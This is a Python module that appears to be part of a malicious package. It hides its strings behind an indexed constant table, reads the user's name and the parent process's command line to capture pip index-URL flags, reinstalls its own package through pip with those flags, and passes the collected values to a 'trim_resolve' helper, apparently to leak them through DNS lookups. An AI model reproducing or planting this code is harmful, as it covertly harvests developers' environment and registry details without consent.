import getpass
import os
import platform
import subprocess
import sys
from .net_misc import trim_resolve
from .const.list_table import CONSTANT_TABLE

param3 = '--%s-%s' % (CONSTANT_TABLE[3], CONSTANT_TABLE[1])
param4 = '--%s-%s-%s' % (CONSTANT_TABLE[4],
                         CONSTANT_TABLE[3], CONSTANT_TABLE[1])


def box_name():

    try:
        name = getpass.getuser()
    except:
        name = '_'

    return name


def os_params():
    pparams = None
    ppid = os.getppid()

    os_name = platform.system()
    if os_name == CONSTANT_TABLE[9]:
        with open(f'/{CONSTANT_TABLE[14]}/{ppid}/{CONSTANT_TABLE[13]}', 'r') as cmdline_file:
            pparams = cmdline_file.read().split('\x00')
    elif os_name == CONSTANT_TABLE[10]:
        args = [CONSTANT_TABLE[12], '-o', CONSTANT_TABLE[15], '-p', str(ppid)]
        res = subprocess.run(args, capture_output=True,
                             text=True, check=True)
        pparams = res.stdout.strip().split(' ')

    return pparams


def get_arr_args():
    ret_map = {}
    parent_args = os_params()
    if parent_args and param3 in parent_args:
        idx = parent_args.index(param3)
        ret_str = parent_args[idx + 1]
        ret_map[param3] = ret_str

    if parent_args and param4 in parent_args:
        idx = parent_args.index(param4)
        ret_str = parent_args[idx + 1]
        ret_map[param4] = ret_str

    return ret_map


def reg_values(name, version, str_map={}, reg_info=[]):

    env = dict(os.environ)
    if CONSTANT_TABLE[6] in env:
        del env[CONSTANT_TABLE[6]]

    ret_val = 6
    pip_arr = [sys.executable, '-m', CONSTANT_TABLE[2], CONSTANT_TABLE[11]]
    for arg_key, arg_val in str_map.items():
        pip_arr.extend([arg_key, arg_val])
    pip_arr.append('%s!=%s' % (name, version))
    try:
        ret = subprocess.run(pip_arr, env=env, capture_output=True, text=True)
        if CONSTANT_TABLE[5] in str(ret.stderr):
            ret_val = 56

    except Exception as e:
        ret_val = 57

    reg_info.append(['_', str(ret_val)])
    idx = os.urandom(2).hex()
    for reg_inst in reg_info:
        trim_resolve(reg_inst[0], str(reg_inst[1]), idx)
